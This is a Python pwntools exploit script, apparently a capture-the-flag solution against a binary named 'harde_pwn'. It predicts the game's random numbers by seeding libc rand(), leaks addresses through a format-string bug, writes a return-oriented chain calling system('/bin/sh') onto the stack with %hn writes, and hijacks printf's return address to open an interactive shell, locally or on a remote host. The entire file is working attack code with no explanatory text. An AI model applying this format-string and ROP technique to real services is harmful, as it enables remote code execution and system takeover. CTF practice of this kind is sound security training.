from ctypes import cdll
from pwn import *
context(os='linux', arch='i386', kernel='amd64')

fname = args.FNAME if args.FNAME else './harde_pwn'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

dll = cdll.LoadLibrary(libname)

def set_seed(seed):
    dll.srand(seed)
    sa(b'ctype game!\n', p32(seed).rjust(0x20, b'a'))

def send_random():
    for i in range(21):
        sla(b'input: \n', str((0x24^dll.rand()) + 1).encode())

def send_fmt(payload):
    sa(b'data ;)\n', payload)

def write(addr, data, size):
    while (size > 0):
        payload = f'%{addr&0xffff}c%15$hn\0'.encode()
        send_fmt(payload)
        payload = f'%{data&0xffff}c%45$hn\0'.encode()
        send_fmt(payload)
        addr += 2
        size -= 2
        data >>= 16


def exp():
    set_seed(0)
    send_random()

    payload = b'%9$p;%11$p;%15$p;\0'
    send_fmt(payload)
    proc_base = int(ru(b';', drop=True), 16) - 0x1543
    libc.address = int(ru(b';', drop=True), 16) - 0x2718a
    stack_ptr = int(ru(b';', drop=True), 16)
    log.success(f'proc_base: {hex(proc_base)}\nlibc_base: {hex(libc.address)}\nstack_ptr: {hex(stack_ptr)}')
    
    stack_print_ret = stack_ptr - 0x140
    binsh = next(libc.search(b'/bin/sh\0'))
    addr_system = libc.sym.system
    prdi = proc_base + 0x15b3
    # 0x00000000000015ae : pop r13 ; pop r14 ; pop r15 ; ret
    pop3 = proc_base + 0x15ae
    # 0x00000000000015ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    pop4 = proc_base + 0x15ac

    write(stack_print_ret+0x28, prdi, 6)
    write(stack_print_ret+0x30, binsh, 6)
    write(stack_print_ret+0x38, addr_system, 6)

    # partially overwrite the printf's return addressn
    write(stack_print_ret, pop4, 2)


if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()